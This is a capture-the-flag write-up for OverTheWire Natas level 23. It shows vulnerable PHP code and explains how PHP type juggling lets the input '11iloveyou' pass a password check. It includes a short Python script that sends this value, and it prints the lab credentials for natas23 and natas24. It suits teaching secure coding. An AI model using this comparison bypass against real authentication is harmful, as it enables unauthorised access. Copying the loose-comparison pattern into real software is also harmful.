# Natas Level 23 Writeup (natas23) – OverTheWire

## Overview

This level focuses on **PHP type juggling**.

The goal is to find the password for the next level.

## Observation

When we open the page, we see an input field:

> **"Password:"**

There is also a link to view the source code:

```text
index-source.html
```

The source code contains:

```php
if(array_key_exists("passwd",$_REQUEST)){
    if(strstr($_REQUEST["passwd"],"iloveyou") && ($_REQUEST["passwd"] > 10 )){
        echo "<br>The credentials for the next level are:<br>";
        echo "<pre>Username: natas24 Password: <censored></pre>";
    }
    else{
        echo "<br>Wrong!<br>";
    }
}
```

## Finding the Password

### Using Browser

1. The input must contain:

   ```text
   iloveyou
   ```

2. It must also satisfy:

   ```text
   passwd > 10
   ```

3. Because PHP converts the input when comparing it with the number `10`, we can use a value that starts with a number greater than `10` and also contains `iloveyou`.

4. Payload used:

   ```text
   11iloveyou
   ```

5. The server then displays the password for **natas24**.

#### Proof

```text
Username: natas24 
Password: shlL4BvOtawNCd81dwdKRHFzmTEjYYQX
```

### Using Python

```python
import requests, re

target = 'http://natas23.natas.labs.overthewire.org'
auth = ('natas23', 'CH1OBxJy8uAxMM15Nx6VXSMwcJbBbnS5')

params = {
    'passwd': '11iloveyou'
}

r = requests.get(target, auth=auth, params=params)

match = re.search(r'Password:\s(\w{32})', r.text)
print("Password for next level is:", match.group(1))
```

## Vulnerability

The application compares the user input with the number `10`.

PHP performs **type juggling** during this comparison, so a value such as:

```text
11iloveyou
```

can satisfy the condition while also containing `iloveyou`.

## Flag

`shlL4BvOtawNCd81dwdKRHFzmTEjYYQX`
